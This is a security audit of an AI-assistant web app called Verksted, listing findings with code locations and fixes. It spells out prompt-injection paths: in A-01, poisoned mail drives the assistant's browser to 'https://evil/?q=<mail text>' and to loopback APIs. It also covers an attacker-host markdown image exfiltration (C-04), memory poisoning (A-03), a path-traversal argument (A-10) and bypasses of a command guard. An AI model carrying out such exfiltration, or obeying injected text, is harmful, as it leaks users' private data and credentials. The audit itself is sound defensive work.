# Verksted audit, 2026-09-19

Audited at commit `ca1c0c7` on `main`. About 68k lines across backend, frontend, runtime, tests and docs.

**Status:** every finding was re-checked against `main` at `01c2e97` on 2026-09-23. See Part 10 at the end:
none is fully open, and about 30 are partly fixed with a gap left in the repo's code.

## How this was done

Six read-only reviews ran in parallel, one per area, each reading its files in full:

1. Assistant backend (`assistant*.ts`, `verksted-mcp.mjs`, council, memory, mail, calendar, speech)
2. Chat view and assistant UI (`Chat.tsx`, `ChatPane.tsx`, `Room.tsx`, `components/chat/*`, `chat.ts`)
3. Backend security surface (origin, paths, exec, routes, websockets, `vk-guard`)
4. Backend reliability and scale (stores, scheduler, events, pollers, lifecycle)
5. Frontend outside the chat (screens, terminal, `usePoll`, PWA, UI consistency, accessibility)
6. Build, container, CI, dependencies, docs, test infrastructure

After each report came back, the high and critical findings were re-read against the source, and two were
checked against the live pod over its API (session count, backup list). Nothing was changed in the repo
other than adding this file.

## How to read it

- IDs: `A` assistant backend, `C` chat view, `S` security, `R` reliability and scale, `F` frontend, `O` ops, build, CI and docs.
- Severity: critical, high, medium, low. Severity assumes the stated design: WireGuard is the auth boundary
  and there is no in-app auth. "Add login" is not a finding anywhere below.
- **Confirmed** means the cited code was re-read a second time after the review and the mechanism holds.
  Findings without that mark were found by reading the code once. **Unverified** marks a runtime effect that
  follows from the code but was not observed.
- **Tracked** means BACKLOG.md already has an entry. Almost nothing below is tracked. Per CLAUDE.md, nothing
  here has been added to BACKLOG.md, because none of it has been agreed as deferred yet. Pick what to do,
  then move the rest.

Parts 1 and 2 (assistant and chat view) come first, as asked. Part 7 collects the structural changes that
make the app hold up over time, part 8 is a suggested order of work, part 9 lists what is done well.

---

## Summary: what to do first

These are ordered by risk times how cheap the fix is. Most are small.

| #   | ID         | What                                                                                                                                                                 | Size                    |
| --- | ---------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------- |
| 1   | R-01       | Session creation stops at 200 sessions in history. The pod has 145 today.                                                                                            | one line                |
| 2   | A-01       | The chair reads mail and documents and also drives an unrestricted browser that can reach the pod's own API on loopback.                                             | medium                  |
| 3   | S-03       | Credentials are passed to tmux as argv. A failed launch returns them in the 500 body and writes them to the logs.                                                    | small                   |
| 4   | S-01, S-06 | No Host allowlist (DNS rebinding) and no security headers (clickjacking, framing).                                                                                   | small                   |
| 5   | R-02, R-03 | The "nightly" backup is a 24h-since-boot timer. The pod's archive list has no backup for 14 and 15 September, the days with a dozen deploys. Failures notify nobody. | small                   |
| 6   | A-04       | Unattended meetings write every advisor's tool config to one shared file while they run in parallel.                                                                 | one line                |
| 7   | C-03       | The fallback "yes / no" strip presses Return on a dialog it could not read. "no" can approve.                                                                        | small                   |
| 8   | C-04       | Model-written markdown images load from any URL on render: a zero-click exfiltration channel.                                                                        | one line                |
| 9   | C-01, C-02 | The assistant socket never reconnects and a stale "thinking" freezes sending. The session chat never updates an answered question or approved plan.                  | small                   |
| 10  | S-04       | `vk-guard` is bypassed by a newline, a prefix word, `git -C`, `--method=`, quoted paths, or a curl to the loopback API.                                              | medium, then structural |
| 11  | A-02, A-03 | Schedule tools reach a shell without a card. `remember` writes standing instructions for every agent from a context that reads stranger text.                        | small                   |
| 12  | O-12       | `make run` and compose publish the no-auth app on all host interfaces.                                                                                               | one line                |
| 13  | F-01, F-04 | The SSE watchdog is never cleared, so push falls back to polling after 8 s. A backdrop tap discards unsaved file edits.                                              | one line each           |
| 14  | O-05, O-06 | Dependabot auto-merges runtime dependencies with no cooldown into a pod holding every token. Agent CLIs and two installers are unpinned.                             | small                   |
| 15  | S-07       | File PUT follows a symlink at the leaf, and backend-run git executes repo-controlled hooks and config with the backend's environment.                                | small                   |

---

## Part 1: Assistant backend

Files: `backend/src/assistant.ts`, `assistant-persona.ts`, `assistant-stream.ts`, `routes/assistant.ts`,
`runtime/verksted-mcp.mjs`, `council-store.ts`, `memory-store.ts`, `profile-store.ts`, `mail.ts`, `gmail.ts`,
`calendar.ts`, `google-auth.ts`, `tts.ts`, `transcribe.ts`.

The theme: the written safety model in ASSISTANT-V2.md ("agents that read stranger text cannot fetch, run or
send") has been overtaken by features. Reversibility and tool separation are enforced by prose in prompts and
tool descriptions more often than by the server.

### Security

**A-01. The chair holds private reads, stranger-written text and an unrestricted browser in one context.** Critical. Confirmed.

- Where: `assistant.ts:159-171` gives the attended chair `playwright-mcp` with no origin flags; `assistant.ts:1069`
  allowlists all of `mcp__browser`. The same chair is offered `mail_read`, `docs_read`, `calendar_*`, `recall`.
  `council-store.ts:141-161` enforces "no private tools beside the web" for members only. The chair is exempt, and the
  comments at `council-store.ts:98-100` and `:423-425` still say the chair has no web tools.
- Mechanism: a mail or document body that talks the chair into `browser_navigate("https://evil/?q=<mail text>")` is a
  full exfiltration path. The browser also runs on the pod, so it can open `http://127.0.0.1:<PORT>/`. From that page every
  `fetch` is same-origin and passes `origin.ts:33`. That reaches `POST /api/proposals/:id/do` (the chair tapping its own
  card), `POST /api/sessions` (a shell), `POST /api/settings/vars/:key/reveal` (plaintext tokens), and cluster-internal
  services.
- Fix: (a) treat the browser as the web half of `PRIVATE_TOOLS`: move it to a member that holds nothing private, or drop
  `mcp__browser` for the rest of a chair turn once a private tool has been called (a taint flag in the MCP server, checked
  by a PreToolUse hook). (b) Block loopback, link-local and cluster CIDRs in the assistant's Chromium
  (`--host-resolver-rules` or a deny proxy). (c) Require a per-boot secret header on card execution and credential reveal
  (see S-05).

**A-02. `create_schedule`, `update_schedule` and `run_schedule` reach a shell session with a model-written prompt and no card.** High. Confirmed.

- Where: `verksted-mcp.mjs:494-575`; `routes/schedules.ts:75-150, 214-226` have no proposal step. `start_session` was put
  behind a card for exactly this reason (`routes/proposals.ts:18-23`).
- Fix: route session-kind create, prompt/cron/enabled changes on session schedules, and run-now on session schedules
  through `propose()`. Assistant-kind schedules can stay direct. Also fix the drift: the persona says "ask first only before
  deleting one" (`assistant-persona.ts:165-169`), the tool says "ask first".

**A-03. `remember` and `person_note` write unreviewed persistent instructions from a context that reads stranger text.** High.

- Where: `verksted-mcp.mjs:1166-1177` PUTs to `/api/memory/:slug`; `memory-store.ts:383-386` injects `preference`
  memories into every agent's global memory file as "their own instructions ... follow them without being asked again"
  (`:458-472`), which shell-holding sessions read. `memory-store.ts:276-278` says the review gate "must not be removed",
  yet the attended chair bypasses it. `person_note` (`:986-995`) appends to the profile in every chair system prompt.
- Mechanism: one poisoned mail read in an attended turn becomes a standing instruction for every future coding session.
- Fix: downgrade both to `propose_memory` whenever the current MCP process has served a tool that returns outside text
  (`mail_read`, `docs_read`, `pr_detail`, `ci_log`, `feed`), or always for `type: preference`.

**A-04. An unattended meeting writes every speaker's MCP config to one shared file.** High. Confirmed.

- Where: `assistant.ts:229` names the file `mcp-unattended` for every unattended speaker, while `assistant.ts:1856-1861`
  runs the convened advisors with `Promise.all`. The docstring at `:216-222` says configs are per speaker for this exact
  reason.
- Mechanism: an advisor can start with another advisor's `VK_TOOLS`, `VK_MEMBER` and headroom server. Michael can get
  headroom without `HEADROOM_DENIED` in his deny list (`:1894-1900` adds it for Ariel only).
- Fix: `mcp-unattended-${o.id}.json`. Add a per-advisor assertion to `scheduler-run.test.ts:781-785`.

**A-05. The "no tool" internal turns (triage, journal, catalogue, learning) still have tools.** Medium. Confirmed.

- Where: `assistant.ts:1782-1806`: an `own` turn changes model, effort and prompt only; `UNATTENDED_BUILTIN_TOOLS` and
  `UNATTENDED_ALLOWED_TOOLS` (Read, Grep, Glob, `mcp__verksted`) stay. `scheduler.ts:563-566` claims the turn "reads
  nothing and writes nothing itself, which is what makes it safe". That is a prompt, not a control. Triage is fed raw mail
  subjects (`scheduler.ts:661-665`).
- Fix: for `own` turns pass empty builtins, empty allow list and an empty `--mcp-config`. Add a test that asserts it.

**A-06. Bare `Read`/`Grep`/`Glob` allow rules plus the whole backend environment.** Medium. CLI scoping unverified.

- Where: `assistant.ts:71, 1071-1078` allowlist the three tools with no path; cwd is `/data/repos` and siblings include
  `/data/settings.json`, `/data/docs`, `/data/assistant/*.jsonl`, `/data/memory`. `assistant.ts:961-963` spawns the CLI with
  `{...process.env, ...agentEnv()}`, so every secret reaches every advisor and MCP child.
- Risk: if the CLI does not confine an unqualified `Read` to cwd, the web-holding advisor can read documents and
  credentials and carry them out through WebFetch, defeating `PRIVATE_TOOLS`.
- Fix: `Read(/data/repos/**)` and friends, explicit denies for `/data/settings.json`, `/proc/**`, `$HOME/.claude/**`. Build
  the child env from an allowlist. Give web-holding members no repo Read.

**A-07. `PRIVATE_TOOLS` omits calendar, recall, feed, loops, `brief_material` and `recent_prompts`.** Medium. Confirmed.

- Where: `council-store.ts:145-161` lists only `mail_*` and `docs_*`. The seeded web advisor holds `recall` (`:336`), which
  searches every past conversation, including mail and document text the chair quoted.
- Fix: invert the list: name the few tools that are safe beside the web and refuse everything else when `web` is true. Test
  it against the MCP tool list the way `TOOL_INVENTORY` is.

**A-08. Mail and calendar tools with no undo are gated by the prompt only.** Medium.

- Where: `mail_rule_create` (`verksted-mcp.mjs:819-837`), `mail_rule_delete` (`:839-847`), `mail_label_delete` (`:849-857`,
  whose own description says the label cannot be put back), `calendar_update`/`calendar_delete` with `every: true`
  (`:935-961`). The persona's own rule is "where there is no undo, propose it" (`assistant-persona.ts:88-91`).
- Fix: card for rule create, label delete and whole-series delete. Write the deleted ICS to a trash directory before
  `deleteCalendarObject` (`calendar.ts:292-294`).

**A-09. `mail_move` can file into Trash or Spam, is held by the advisor that reads hostile mail, and nothing can move mail back.** Medium.

- Where: `mail.ts:222-226` refuses only the inbox role; `withInbox` (`mail.ts:70-79`) fixes the source to INBOX, so "undone
  by moving them back" (`verksted-mcp.mjs:766`) is not something any tool can do. `mail_relabel` removes INBOX from 50
  messages per call by search (`gmail.ts:234, 258-280`).
- Fix: refuse `trash` and `junk` destinations outside a card; log every move and relabel (uids, uidMap, query, labels) to an
  append-only file so undo is possible; add a source-folder parameter.

**A-10. The MCP server never validates arguments and interpolates several unencoded.** Medium-low. Partly tracked ("hand-rolled JSON-RPC").

- Where: `verksted-mcp.mjs:216, 351, 415, 423, 449, 467` interpolate `a.lines`, `a.number`, `a.id` raw. `tools/call`
  (`:1245-1255`) never checks arguments against `inputSchema`. `fetch` normalises `..`, so
  `id: "../../../schedules/<id>/run?x="` turns `ci_rerun` into `POST /api/schedules/<id>/run`.
- Mechanism: the `VK_TOOLS` and `VK_UNATTENDED` filters assume each tool is confined to its endpoint. It is not.
- Fix: coerce integers, `encodeURIComponent` every path segment, a 20-line schema check in `handle()`.

**A-11. OAuth token handling.** Low-medium.

- The refresh token is plaintext in `settings.json` and returned whole by `POST /api/settings/vars/GOOGLE_REFRESH_TOKEN/reveal`
  (`routes/settings.ts:126-133`), which A-01 makes reachable by the chair. `status()` (`google-auth.ts:103-110`) reports
  connected whenever a token is stored, so a revoked token still shows green.
- Fix: exclude source keys from `reveal`; record the last refresh error and surface it in `/api/calendar/google`.

**A-12. The `notify` link pattern admits `/\host`.** Low. See S-12 for the full finding.

### Correctness and reliability

**A-13. UTF-8 sequences split across stdout chunks are corrupted.** Medium. Confirmed.

- Where: `assistant.ts:1001` `consumeChunk(d.toString(), state)`. An æ, ø or å that straddles a pipe chunk becomes U+FFFD
  in both halves and the stored entry keeps it.
- Fix: `child.stdout.setEncoding("utf8")` (and stderr). Add a split-character test to `assistant-stream.test.ts`.

**A-14. `--resume` versus `--session-id` is inferred from the thread file and can desync permanently.** Medium. CLI error behaviour unverified.

- Cases: stop pressed between a held convene reply and its append (`assistant.ts:1556-1558`); a pod restart during a
  thread's first turn; a first turn that fails before the CLI creates the session (a `failed` entry still makes
  `chairHasSpoken` true, `:1375-1378`); advisors whose id is persisted before the turn runs (`:485-488`).
- Fix: decide from whether claude's transcript file exists (`claude-home.ts` knows the path), ignore `failed` entries, retry
  once with the other flag on the two known CLI errors.

**A-15. Timeouts and stop signal only the CLI pid; unattended turns cannot be stopped.** Medium-low.

- Where: `assistant.ts:996-999` `child.kill("SIGKILL")` with no process group, so `playwright-mcp`, headroom and any
  in-flight MCP fetch are left behind. `:833` sends SIGTERM with no escalation. `:1836, 1874` pass `onSpawn: () => {}`, so a
  wedged nightly run blocks every other unattended turn for 10 minutes each.
- Fix: spawn `detached: true`, kill `-pid`, SIGTERM then SIGKILL after 5 s, register unattended children in `running`.

**A-16. `tts.ts` has no `error` handlers on the worker or its stdin.** Medium. Confirmed.

- Where: `tts.ts:88-95` spawns with no `proc.on("error")`; `:195` writes to stdin with no error listener. A spawn failure or
  an EPIPE is an unhandled `error` event, which takes the backend down along with every tmux attach. `:108` rejects after
  60 s without killing the process. `assistant.ts:352` `readTools` awaits with no timeout and caches the hung promise.
- Fix: add both handlers and route them into `pending`; kill on start timeout; a 10 s timer on `readTools`.

**A-17. No backpressure on speech endpoints.** Medium-low.

- The TTS queue is an unbounded promise chain (`tts.ts:54, 176-208`) and keeps synthesising for clients that left.
  `transcribe()` has no concurrency guard (ffmpeg plus `whisper-cli -t 4` per call). `voices()` loads the whole model to list
  names and is called on every council save with a voice.
- Fix: queue depth cap with 429, serialise transcription, persist the voice list after first load.

**A-18. MCP `call()` has no timeout, and `run_schedule` blocks a tool call for a whole unattended run.** Medium-low.

- Where: `verksted-mcp.mjs:19-28` `fetch` with no signal; `routes/schedules.ts:217-225` awaits `runUnattended`.
- Fix: `AbortSignal.timeout(30_000)` by default; make assistant-kind run-now answer 202.

**A-19. Non-atomic memory writes, unserialised `inject()`, and a marker that memory text can break.** Low-medium.

- `memory-store.ts:121, 241, 325, 466` use `fs.writeFile` though `writeTextAtomic` exists. `inject()` is a concurrent
  read-modify-write of the user's global agent memory files. `renderLine` (`:444-447`) does not strip
  `<!-- verksted:memory end -->`, so a memory containing it strands everything after it outside the managed block, where
  `forget` can never remove it. `appendProfileLine` is unserialised too.
- Fix: atomic writes, one promise chain for `inject`, reject or escape the markers in `save`.

**A-20. The turn POST stays open for the whole meeting.** Low-medium.

- `routes/assistant.ts:57` awaits `assistant.send`: worst case chair 10 min, six advisors at 5 min, closing chair 10 min.
  Any gateway idle timeout produces a client error while the turn carries on.
- Fix: return 202 once the user entry is appended. The websocket already delivers everything. This also fixes C-13.

**A-21. Smaller items.** Low.

- `assistant.ts:1019` accumulates stderr without a cap.
- `gmail.ts:88` `JSON.parse` on an HTML error body throws; no retry or backoff on 429/5xx in `gmail.ts`, `calendar.ts`, `mail.ts`.
- tsdav calls in `calendar.ts:59-108` have no timeout.
- ffmpeg runs on uploaded bytes with no `-protocol_whitelist file,pipe` and no `-t` cap (`transcribe.ts:59`).

### Performance and cost

**A-22. The whole thread is re-read from disk and re-sent up to ten times a second while the chair streams.** See C-05 (same mechanism, both ends).

**A-23. Gmail: a token refresh per call and repeated label listings.** Medium.

- `gmail.ts:72-78` calls `accessToken()` inside every `call()`. `createRule` with a new label is four refreshes and two
  identical label listings (`:178-195`); `relabel` lists labels per added name (`:276-279`).
- Fix: cache the access token until `expires_in - 60`; pass the label map down.

**A-24. Calendar: every update or delete downloads three years of every calendar.** Medium.

- `calendar.ts:177-195` `find(uid)` loops all calendars with a 365-back, 730-forward range and parses every object. Each
  `connect()` is a fresh discovery plus a token trade.
- Fix: a `calendar-query` REPORT with a UID prop-filter; for events this app created the href is `<uid>.ics` (`:165-169`).

**A-25. `mail_read` downloads the full message, attachments included, to return 12 KB.** Low-medium.

- `mail.ts:150-157` `fetchOne(..., { source: true })` then `simpleParser`. One IMAP login per tool call.
- Fix: fetch `bodyStructure`, then only the text part with `maxBytes`.

**A-26. No budget on attended turns, and per-turn usage is thrown away.** Medium.

- The only ceiling is `MAX_UNATTENDED_PER_DAY`, in memory. `@all` with round table is up to eight model calls and
  `effort: "max"` is accepted (`routes/assistant.ts:241`). The `result` event is read only for `is_error`
  (`assistant-stream.ts:182-192`); its usage fields are dropped. Threads resume indefinitely with tool results in context.
- Fix: store `usage` from the result event on each turn's last entry, show a thread total, add a daily attended ceiling
  and a "this thread is long, start a new one" threshold.

**A-27. History scans.** Low. Tracked ("Nothing prunes the assistant's own directory").

- `search`, `listThreads` and `saidOn` each read and parse every thread file. Uploads and screenshots are never removed.

### Maintainability

**A-28. Natural seams in the 1948-line `assistant.ts`.** Medium.

- Tool policy and MCP config (`:71-239, 1061-1123, 1894-1900`); thread store (`:241-303, 366-452, 652-812`); turn runner
  (`:852-1051`); meeting orchestration (`:1152-1713`); unattended runs (`:1738-1948`); tool listing (`:315-364`). The first
  and third have no dependency on chat state and can move without touching the tests' fakes.
- Duplication: four hand-built sinks, the unattended member Speaker built twice, `headroomConfigured` twice, and the
  hold-convene-then-close sequence twice (`runChair` and `runUnattended`), which is how A-04 came to exist in only one.

**A-29. Three hand-kept tool lists, and safety reasoning that lives in stale comments.** Medium. Partly tracked.

- The tool definitions, `TOOL_INVENTORY`, `PRIVATE_TOOLS` (not tested against anything) and the `unattended` flags.
  Reversibility (direct or card) is a fifth, implicit property spread across descriptions and the persona.
- Fix: one table next to the tool definitions with `{ unattended, chairOnly, private, effect: "read" | "reversible" | "card" }`,
  exported through `tools/list`, consumed by `council-store.ts` and a test. This is the single change that makes A-02,
  A-03, A-07 and A-08 enforceable.

**A-30. Weak typing at the edges.** Low.

- `verksted-mcp.mjs` is 1288 lines of unchecked JS that destructures backend responses blindly. Casts at
  `routes/assistant.ts:249`, `routes/memory.ts:53, 99`, and `JSON.parse(line) as AssistantEntry` on hand-editable files.
- Fix: `// @ts-check` with JSDoc imports from `shared/api.ts`, or compile the server from TypeScript with esbuild at image
  build (which also removes the path problem BACKLOG gives for not using the SDK).

### Missing features

**A-31. What a production-grade personal assistant would add.**

- Tool-call audit log (high): today a mutation leaves a name and 80 characters of one argument
  (`assistant-stream.ts:43-52, 136`). An append-only JSONL of every non-read MCP call with full arguments, result, thread
  id and speaker, written in `handle()`, is the base for undo and for answering "what did it do last night".
- Undo (high): replayable move and relabel logs, a trash directory for deleted ICS files, label and rule snapshots.
- Enforced permission tiers (high): read, reversible, card as data (A-29), plus the taint rule from A-01 and A-03.
- Cost: per-turn usage, thread totals, daily attended budget (A-26).
- Conversation export and server-side thread compaction or rollover.
- Wrap outside text in explicit delimiters when tools return it, and strip hidden HTML: `htmlToText` (`mail.ts:288-305`)
  keeps `display:none` text the person never sees.
- Injection regression suite: canary mails, documents and PR bodies replayed against a real model, asserting no card,
  memory, schedule or navigation results.
- Speech to text is English only (`ggml-base.en.bin`) while the persona treats Norwegian as equal. BACKLOG tracks the TTS
  half only.

### Test gaps

**A-32.** No test for: the turn timeout and kill path; per-advisor unattended MCP config (A-04); schedule tools being
carded (A-02); stop between a held convene line and its append (A-14); a multi-byte chunk boundary (A-13);
`PRIVATE_TOOLS` against the tool list (A-07); MCP argument traversal beyond `repo_diff` (A-10); the transcribe route,
size limit and ffmpeg failure; a tts worker crash, EPIPE or start timeout (A-16); gmail refresh failure, 403, 429; calendar
`find`/`put`/`remove` against a fake DAV server; `own` turns spawning without tools (A-05).

---

## Part 2: Chat view and assistant UI

Files: `frontend/src/screens/Chat.tsx`, `components/ChatPane.tsx`, `Room.tsx`, `AssistantPanel.tsx`, `CouncilPanel.tsx`,
`MemoryPanel.tsx`, `ProfilePanel.tsx`, `components/chat/*`, `useSpeech.ts`, and the backend feeding them
(`backend/src/chat.ts`, `tui-prompt.ts`, `transcripts.ts`).

Note: `mock.html` has no chat design, so there is no design reference for this screen. That shows in finding C-22 and C-35.

### High

**C-01. The assistant websocket never reconnects, and a stale "thinking" strands the send queue.** High. Confirmed.

- Where: `Chat.tsx:644-656`: one `new WebSocket` with only `onmessage`. No `onclose`, no retry, no visibility handling, and
  it does not report to `connection.ts`, so the ConnectionBanner never fires. The server has no ping either
  (`routes/assistant.ts:325-335`).
- Chain: phone sleeps mid-turn, socket dies, last frame said `thinking`. `send()` (`:735-738`) queues everything while
  thinking, and the drain effect (`:772-777`) only runs when `thread` changes, which it never will. The composer says
  "working..." until a reload. The header says "connecting..." forever if the first connect fails.
- Fix: a `useAssistantThread` hook: reconnect with backoff on close and on `visibilitychange`, fall back to
  `GET /api/assistant` on a slow timer while the socket is down, show "reconnecting...", report reachability.

**C-02. The session chat never updates a message it already holds, so answered questions and approved plans stay open.** High. Confirmed.

- Where: `ChatPane.tsx:327-334` merges append-only by id. The server mutates already-emitted messages: `chat.ts:534-536`
  pushes `${id}:ask` with `answered: false` and `:475-491` later sets `answered`, `chosen`, `approved`.
- Fix: upsert by id (replace when a cheap signature of `ask`/`plan` differs), and have the server always include open or
  just-closed card messages regardless of `since`.

**C-03. The fallback "yes / no" strip sends a letter plus Return into a dialog it could not read.** High (safety). Confirmed in code, unverified on a live pane.

- Where: `LivePrompt.tsx:101-114` `onSend("y")` / `onSend("n")`; `ChatPane.send` posts `{ text, enter: true }`. The same
  file's comment at `:57-59` says Return "does not submit, it toggles whatever the cursor happens to be sitting on". For a
  numbered dialog the parser failed to read (more than 10 options, a redrawn layout after a CLI release), "n" is not bound
  and Return confirms the highlighted option, normally "Yes".
- Fix: in the unparsed case offer only "open terminal" and "esc", or send with `enter: false`.
- Same pattern in the Inbox: see F-37.

**C-04. Model-written markdown images load from any remote URL on render.** High for the assistant, medium for session chat. Confirmed.

- Where: `components/chat/markdown.tsx:24-75` overrides `a`, `code`, `table` but not `img`. Used in `Room.tsx:73`,
  `ChatPane.tsx:201`, `ToolChip.tsx`, `PlanCard.tsx`, `ProposalCard.tsx`.
- Mechanism: a prompt-injected reply containing `![x](https://attacker/?d=<secret>)` makes the browser issue the request
  with no click. WireGuard does not stop outbound browser requests.
- Fix: `img: () => null` (or render alt text as a link), or allow only same-origin `/api/...`. Add a case to
  `frontend/test/markdown.test.tsx`. A CSP `img-src 'self' data: blob:` (S-06) closes it at a second layer.

**C-05. Streaming re-sends the whole thread up to 10 times a second, and the client re-parses and re-renders all of it.** High on long threads on a phone. Confirmed.

- Server: `assistant.ts:599-614`: `push()` does `await readThread()` (full file read plus per-line `JSON.parse`, on NFS)
  and the route stringifies it per socket, throttled only to 100 ms.
- Client: `Chat.tsx:647-649` `setThread(JSON.parse(...))` gives every entry a new identity, so `Room` re-parses every
  message's markdown per frame. Nothing in Room is memoized. `useSpeech` returns a fresh object per render, so the
  read-aloud effect (`:796-817`) runs on each of those renders too.
- Fix: send `{live}`-only frames during deltas and the full thread only when entries change; keep the open thread's entries
  in memory server side (the file is append-only and this module is the only writer). On the client, `React.memo` the
  bubbles with an `id + text + tools.length` comparator, `useMemo` for `blocks` and `byId`, memoize the `useSpeech` result.

**C-06. Every 3 s session-chat poll re-reads and re-parses the entire tail window; nothing is cached.** High at large windows. Confirmed. Partly tracked ("The chat view is polled, not pushed" covers transport and says an idle poll is a few hundred bytes, which is true on the wire and not true of server work).

- Where: `chat.ts:155-171` (`tail` reads up to 8 MB), `:627-670` (`readChat` parses every line, including multi-megabyte
  base64 screenshot lines, then applies `since` to the output). After "load earlier" this is 8 MB of read and parse every
  3 s per open client. `readImage`/`readDetail` repeat the full parse per image and per chip.
- Fix: `stat` first and return the cached parse when `(path, size, mtimeMs, bytes)` is unchanged. Better: a per-file
  parsed index with byte offsets that parses only appended bytes. Skip `JSON.parse` for image lookups until
  `line.includes(ref)` hits.

**C-07. "Read replies aloud" reads the entire existing thread on every visit.** High (annoyance plus synthesis cost). Confirmed.

- Where: `Chat.tsx:626-633`: `speakReplies` is restored from localStorage and `spokenRef` starts empty, so the effect at
  `:796-817` treats every old assistant entry as unread on the first frame. The toggles pre-mark existing entries; the first
  socket frame does not.
- Fix: on the first thread received, and on any change of `conversationId`, add all entry ids to `spokenRef` before the
  effect can run.

### Medium

**C-08. The assistant chat yanks the reader to the bottom on every streaming tick; no "jump to latest".**
`Chat.tsx:679-681` scrolls unconditionally, keyed on `thread?.live`. ChatPane tracks `atBottom` as a ref, so it has no "new
messages" pill either. Fix: one `useStickToBottom` hook for both, follow only when at bottom, a floating "latest" button.

**C-09. ChatPane re-parses every message's markdown at least every 3 s even when nothing changed.**
`ChatPane.tsx:320-324` sets `pending` and `todos` to new arrays per poll and `:380` sets `prompt` to a new object; `Turn`
is a plain function with `<Markdown>` inside. Fix: `React.memo(Turn)`, and skip the setters when deep-equal.

**C-10. "Load earlier" blanks the conversation, shows skeletons, and lands the reader at the bottom.**
`ChatPane.tsx:286-295` begins with `setMessages([]); setLoading(true)`, and `atBottom` is still true when the longer list
arrives. Fix: keep the old list, prepend, restore `scrollTop` by the `scrollHeight` delta.

**C-11. ProfilePanel drafts from cached `usePoll` data without waiting for `fresh`, and a save overwrites lines the assistant added.**
`ProfilePanel.tsx:23, 32`: this is the exact pattern CLAUDE.md warns about; `AssistantPanel.tsx:88-90` does it right. The
PUT has no If-Match (`routes/profile.ts:18`), so saving deletes a line added meanwhile. Fix: disable the textarea until
`fresh`; send a hash or mtime and answer 409 on mismatch.

**C-12. `newThread()` blanks the screen and swallows failure; `stop()` swallows failure.**
`Chat.tsx:862-865, 858-860`. A failed stop shows nothing while the turn keeps spending. Fix: keep the old thread until the
new one arrives, set `error` on failure.

**C-13. No optimistic user bubble in the assistant chat.**
`Chat.tsx:732-739` clears the field and POSTs; the message appears only when a socket frame arrives. With the socket down
the POST does not return until the turn ends (up to 11 minutes). ChatPane already solves this with `echoes`. Fix: a pending
bubble from the in-flight post. A-20 (202 on accept) helps here too.

**C-14. Echo matching is exact-text, so a sent message can show twice for 90 s.**
`ChatPane.tsx:509` leaves a trailing space after attached paths, `:524` stores the echo untrimmed, the server trims
(`chat.ts:394`). Two identical sends are both cleared by the first match. Echo keys are array indexes. Fix: trim before
sending and storing, remove one echo per match, key by `at`.

**C-15. Chips and images are resolved against a sliding tail window, so things on screen stop opening.**
`chat.ts:762-766` claims the reference is "inside it by construction", but the client accumulates while the file grows. Older
chips answer `kind: "none"` and lazy images 404 once their line leaves the last `bytes`. The `bytes` query also busts the
`immutable` cache for every image on "load earlier". Fix: carry each message's byte offset and let detail and image requests
pass an absolute offset; drop `bytes` from the image URL.

**C-16. One oversized line at the tail makes the chat say "nothing said yet".** Confirmed.
`chat.ts:163-167`: when the window holds no newline the text is `""`. A screenshot's base64 line is commonly larger than
the 256 KB default window. No test covers it. Fix: widen the read automatically up to `MAX_WINDOW` when no newline is
found or fewer than N messages parse.

**C-17. Dock panels are full-screen overlays on a phone with no Back or Escape handling and no dialog semantics.**
`Chat.tsx:303-340`: no `useDismissOnBack` (compare `Sheet.tsx:29`). Android Back leaves `/ai` instead of closing the
calendar. Focus stays in the page underneath. Fix: `useDismissOnBack` for all three, Escape for calendar and people,
`role="dialog"` plus `inert` on the page.

**C-18. `Sheet` declares `aria-modal="true"` but never moves, traps or restores focus.** See F-22 (same component, app-wide).

**C-19. No live region anywhere in either chat.**
No `aria-live`, `role="log"`, `role="status"` or `role="alert"` in `Chat.tsx`, `Room.tsx`, `ChatPane.tsx` or
`components/chat/`. Fix: `role="log" aria-live="polite"` on the lists (hide the token-by-token node and announce the
finished entry), `role="status"` on status strips, `role="alert"` on errors.

**C-20. Voice mode dies silently.**
`useSpeech.ts:250-256` swallows a denied microphone; `:310` returns without re-listening when nothing was heard;
`:319-325` treats a failed transcription as silence. The pill still reads "voice mode on". Unverified on device:
`new AudioContext()` at `:260` is created outside a user gesture when the mic reopens after a reply. Fix: an `error` state
from `useSpeech`, shown in the pill with "listen again"; call `context.resume()`.

**C-21. Drafts and the send queue are lost on navigation or reload.**
`Chat.tsx:596, 599, 606`; `ChatPane.tsx:261`. Tapping a citation chip navigates away and discards a half-typed message and
the queue. Fix: persist the draft per thread or session id in `sessionStorage`; persist `queued` or warn before leaving.

**C-22. Two composers with diverged behaviour; a bug fixed in one is still in the other.**
`ChatPane.tsx:666-683` handles `clipboardData.items` for pasted screenshots; `Chat.tsx:1129-1137` still reads only
`clipboardData.files`. Also diverged: busy state while attaching, silent drop past four files, type checks, icons versus
text glyphs that `Chat.tsx:26-30` itself documents as a fault. Fix: one `Composer` component used by both.

**C-23. Links built from external data are not scheme-checked.**
`Chat.tsx:515-523` `<a href={e.url}>` from an invite's `URL` property (`calendar.ts:795-796`, third-party controlled);
`ChatPane.tsx:54-57` from `entry.prUrl` read from a transcript the agent can write. Whether React 19 blocks `javascript:`
here is unverified. Fix: keep a URL server side only if its protocol is `http:` or `https:`; require a github.com host for
`prUrl`.

**C-24. A malformed `vk:` link in a stored reply crashes the whole chat screen, every time.**
`cite.tsx:64-67` runs `decodeURIComponent` during render, which throws on `vk:doc/%E0%A4%A`. The only boundary is
app-level, so `/ai` shows "this screen crashed" until the thread is deleted through the API. Fix: try/catch in `citePath`;
an ErrorBoundary per Room block; a case in `cite.test.ts`.

**C-25. Session-chat pollers can overlap and apply answers out of order.**
`ChatPane.tsx:296-346`: `setInterval` every 3 s with no in-flight guard while `api` waits up to 15 s. `usePoll` has a
generation counter for this; the hand-rolled loop does not. No `visibilitychange` kick either. Fix: chain with
`setTimeout` after completion or add a generation ref.

**C-26. `roundTable` and `thread.speaking` exist in the API and nothing in the UI uses them.**
`routes/assistant.ts:45-48` accepts `roundTable`; `Chat.tsx:750-753` never sends it. `assistant.ts:805-810` puts
`speaking` on the thread; no reader in `frontend/src`. Fix: draw the speaking members' portraits in the thinking row;
expose round table or delete the parameter (CLAUDE.md: no dead code).

**C-27. Destructive actions without confirmation, with errors swallowed, next to ones that confirm.**
Thread delete confirms, but `MemoryPanel.tsx:199-202, 241-244` forgets a memory on one tap with `.catch(() => {})`, and
`CouncilPanel.tsx:140-149` removes a specialist on one tap. `startHarvesting` has no catch. `CouncilPanel.tsx:152` uses
`window.prompt`, which `useConfirm.tsx:18` calls unreadable on a phone. Fix: `useConfirm` for all three, show errors,
an inline id field.

### Low

